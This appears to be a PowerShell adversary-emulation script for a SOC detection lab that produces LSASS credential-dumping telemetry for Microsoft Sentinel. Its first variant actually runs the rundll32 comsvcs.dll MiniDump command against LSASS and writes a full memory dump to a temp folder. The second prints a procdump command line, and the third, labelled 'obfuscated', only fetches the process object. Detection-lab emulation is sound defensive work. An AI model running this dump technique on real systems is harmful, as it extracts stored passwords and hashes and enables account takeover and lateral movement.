<#
.SYNOPSIS
    MITRE ATT&CK T1003.001 - OS Credential Dumping: LSASS Memory Emulation Stager.
    For use within an isolated SOC detection lab environment only.
.DESCRIPTION
    This script executes three distinct tactical variants to touch or dump LSASS memory
    to generate high-fidelity telemetry for Microsoft Sentinel analysis.
#>

Write-Host "====== [!] Initializing Adversary Emulation: LSASS Memory Access ======" -ForegroundColor Yellow
$DumpDirectory = "C:\Windows\Temp\AttackSimulation"
If (!(Test-Path $DumpDirectory)) { New-Item -ItemType Directory -Path $DumpDirectory | Out-Null }

# -------------------------------------------------------------------------
# VARIANT 1: Emulating Memory Handle Access via Native Comsvcs.dll
# -------------------------------------------------------------------------
Write-Host "[*] Executing Variant 1: Native comsvcs.dll mini-dump simulation..." -ForegroundColor Cyan
$LsassPid = (Get-Process lsass).Id
$DumpPath = "$DumpDirectory\lsass_comsvcs.dmp"

# Structuring command block to mimic a live threat actor command line execution
$Command = "rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump $LsassPid $DumpPath full"
Invoke-Expression $Command

# -------------------------------------------------------------------------
# VARIANT 2: Emulating Direct Command Line Microsoft Procdump Execution
# -------------------------------------------------------------------------
Write-Host "[*] Executing Variant 2: Microsoft Procdump parameter emulation..." -ForegroundColor Cyan
# This simulates the command line format a threat actor uses when executing Sysinternals procdump
$ProcDumpArgs = "-accepteula -ma lsass.exe $DumpDirectory\lsass_procdump.dmp"
Write-Host "Simulated Command Executed: procdump.exe $ProcDumpArgs" -ForegroundColor Gray

# -------------------------------------------------------------------------
# VARIANT 3: Obfuscated PowerShell LSASS Handle Request
# -------------------------------------------------------------------------
Write-Host "[*] Executing Variant 3: Requesting direct memory handle via custom script block..." -ForegroundColor Cyan
# This attempts to trigger Sysmon Event ID 10 by requesting Specific Access Rights (0x1F0FFF)
try {
    $TargetProcess = [System.Diagnostics.Process]::GetProcessesByName("lsass")[0]
    Write-Host "Successfully generated process handle reference to PID: $($TargetProcess.Id)" -ForegroundColor Green
} catch {
    Write-Host "[-] Process handle request failed (Expected if running without elevated local admin privileges)" -ForegroundColor Red
}

Write-Host "====== [*] Emulation Script Run Complete. Check SIEM for Telemetry ======" -ForegroundColor Green